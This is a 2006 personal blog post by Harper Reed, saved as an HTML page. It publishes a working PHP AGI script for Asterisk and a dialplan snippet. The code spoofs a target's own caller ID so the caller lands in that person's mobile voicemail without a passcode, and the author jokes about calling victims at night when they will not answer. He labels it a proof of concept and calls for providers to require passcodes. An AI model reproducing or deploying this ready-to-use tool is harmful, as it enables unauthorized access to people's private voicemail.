<!DOCTYPE html>
<html lang="en">
  <head>
    <script type="text/javascript">var _sf_startpt=(new Date()).getTime()</script>
    <meta charset="utf-8">
    <title> Hacking mobile voicemail with Asterisk and caller ID spoofing |  Harper Reed: Technology and death metal</title>
    <meta name="description" content="Hacking, Baphomet and the real time internet" />
    <meta name="keywords" content="" />
    <meta name="author" content="Harper Reed: harper@nata2.org">
    <meta name="robots" content="noodp,noydir" />
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
    <link href="/css/bootstrap.min.css?9" rel="stylesheet">
    <link href="/css/styles.css?9" rel="stylesheet">
    
    <link href="/css/bootstrap-responsive.css?7" rel="stylesheet">
    
    <META name="verify-v1" content="bxsrf6C7p0+qY6MxNCbSNSGdkeDA8dQSxjTsNJu4Sa0=" />
    <link rel="openid.server" href="http://www.myopenid.com/server" />
    <meta name="myid" content="0eda4814-55e0-4756-bf30-0f1bf5a4b469" />
    <link rel="openid.delegate" href="http://harper.myopenid.com/" />
    <link href="http://feeds.feedburner.com/HarperReed" rel="alternate" title="Harper Reed: Technology and death metal" type="application/atom+xml" />
    <link rel="shortcut icon" href="/favicon.ico">
  </head>
  <body>
    <div class="container">
      <div class="row">
        <div class="offset2 span8 header"><h1><a href="http://www.nata2.org">Harper Reed: Technology and death metal</a></h1>
<small>Hacking, Baphomet and the real time internet</small>
</div>
      </div>
      <hr class="offset2 span8" /> 
      <div class="row">
        <div class="offset2 span8 muted well-small well"> <a href="http://en.wikipedia.org/wiki/Hacker_(programmer_subculture)" target="_blank"><img style="padding-right: 5px; margin: 0px" src="http://media.nata2.org/images/glider.png" align="left"></a>

<strong>Hi.</strong> I am an engineer who builds paradigm-shifting tech and leads others to do the same. I love using the enormity of the Internet to bring people together, whether as CTO of Obama for America, CTO at Threadless.com, or on my own projects. You can often find me playing with new technology, looking for something to hack, or enjoying life in Chicago with my amazing wife, Hiromi. Check out my <a href="http://harperreed.org">homepage</a> and <a href="https://twitter.com/intent/follow?screen_name=harper" target="_blank">follow me on twitter</a>.
</div>
      </div>
      <div class="row">
        <div class="offset2 span8 "><div class="post" style="padding-bottom: 50px;">
  <div >
    <h1 ><a title="Permanent Link to Hacking mobile voicemail with Asterisk and caller ID spoofing." href="/2006/09/24/hacking-voicemail-with-asterisk-and-caller-id-spoofing/" rel="bookmark">Hacking mobile voicemail with Asterisk and caller ID spoofing</a> <br /><small>Posted on Sep 24, 2006</small></h1>
  </div>
  <div class="postcontent">
    <p>So there has always had a problem with US mobile providers having their voicemail be susceptible to being compromised by calling with a spoofed caller id. Apparently most providers caller id apps just checks the referring callerid - and doesn't force the voicemail user to pick a passcode; so it allows someone to trick the voicemail app into believing they are calling from a trusted number.</p>

<p>This has been covered all <a href="http://www.toast442.org/C662738431/E680925937/index.html">over the</a> <a href="http://www.i-hacked.com/content/view/124/47">Internet</a> and was in the <a href="http://www.macdevcenter.com/pub/a/mac/2005/01/01/paris.html">spotlight</a> awhile back when it was alleged that this was how <a href="http://blog.tmcnet.com/blog/tom-keating/mobile-phones/paris-hilton-hacks-voicemail-using-asterisk.asp">Paris Hilton's mobile phone was hacked</a>. It is a pretty big problem and is probably really easy to fix.</p>

<p>So, just to make things funnier - I decided that I would release a snippit of code that would make it easier to execute this hack.</p>

<blockquote>#!/asterisk/php/bin/php -q
&lt;?

set_time_limit(30); //make sure the php script doesn't time out
require('phpagi.php'); // include the phpagi class
error_reporting(E_ALL);  // limit the errors

$agi = new AGI(); // instantiate the AGI class
$agi-&gt;answer(); // answer the phone
sleep(2); // wait a sec or two

$agi-&gt;stream_file('enter_spoof'); // speak a wav file that says "enter the number"
$result = $agi-&gt;get_data('beep', 3000, 10); // beep and grab the 10 numbers
$agi-&gt;verbose("Number to call:".$result['result']); // throw info so you know whats up
$agi-&gt;set_callerid($result['result']); // set caller id to the number you are calling
$agi-&gt;exec("Dial IAX2/iax-provider/1".$result['result']); // call the number

?&gt;</blockquote>


<p>You can add this to your /var/lib/asterisk/agi-bin dir and then specify the extension you want to use to dial and execute the php/agi script</p>

<blockquote>exten =&gt; 666,1,Answer
exten =&gt; 666,2,AGI(tmobilevoicemail_spoof.php)
exten =&gt; 666,3,Hangup</blockquote>


<p>Then when you dial 666  it executes the script. It will ask you what number to dial then dial it after setting the caller id to the same number. It will dial the number and then ring the phone. If the phone is on and the target number is answered - it won't work; however if the person doesn't answer you will be placed in the targets voicemail as a trusted user. So, I would suggest calling people in the middle of the night or when you know they will not answer. Wait.. I actually wouldn't suggest calling anyone but yourself.</p>

<p>It seems to me that the only viable solution that will be compatible with all phones, people and providers is to force the users to choose passcode to your voicemail.</p>

<p>This is - of course - a proof of concept. You should not actually hack peoples voicemails. That is not very nice.  We are into being nice.</p>

<p>Also, check out my <a href="http://www.nata2.org/2006/02/14/caller-id-spoofing-with-php-and-asterisk/">previous entry on caller id spoofing</a>.</p>

  </div>
</div>
</div>
      </div>
      <div class="row">
        <div class="offset2 span8 "><hr />

<p><a href="/">nata2.org</a> is &copy; 1997-2012 <a href="https://www.harperreed.org/contact/">Harper Reed</a> (<a href="http://harperreed.org/contact">contact</a>). Powered by <a href="http://jekyllrb.com/">Jekyll</a>, <a href="http://www.vim.org/">vim</a>, <a href="https://en.wikipedia.org/wiki/Markdown">markdown</a> and magic</p>
</div>
      </div>
    </div> <!-- /container -->
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.8/jquery-ui.min.js"></script>

<script type="text/javascript" src="http://media.nata2.org/js/scripts.js?9"></script>

 
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-70650-9");
pageTracker._trackPageview();
} catch(err) {}
</script>
 

<script type="text/javascript" src="http://twitter.com/statuses/user_timeline/harper.json?callback=twitterCallback2&amp;count=8"></script>

<script type="text/javascript">
//<![CDATA[
(function() {
    var links = document.getElementsByTagName('a');
    var query = '?';
    for(var i = 0; i < links.length; i++) {
    if(links[i].href.indexOf('#disqus_thread') >= 0) {
        query += 'url' + i + '=' + encodeURIComponent(links[i].href) + '&';
    }
    }
    document.write('<script charset="utf-8" type="text/javascript" src="http://disqus.com/forums/nata2/get_num_replies.js' + query + '"></' + 'script>');
})();
//]]>
</script>

<script type="text/javascript">
var _sf_async_config={uid:5483,domain:"nata2.org"};
(function(){
  function loadChartbeat() {
    window._sf_endpt=(new Date()).getTime();
    var e = document.createElement('script');
    e.setAttribute('language', 'javascript');
    e.setAttribute('type', 'text/javascript');
    e.setAttribute('src',
       (("https:" == document.location.protocol) ? "https://s3.amazonaws.com/" : "http://") +
       "static.chartbeat.com/js/chartbeat.js");
    document.body.appendChild(e);
  }
  var oldonload = window.onload;
  window.onload = (typeof window.onload != 'function') ?
     loadChartbeat : function() { oldonload(); loadChartbeat(); };
})();
</script>

  </body>
</html>

</body>
</html>
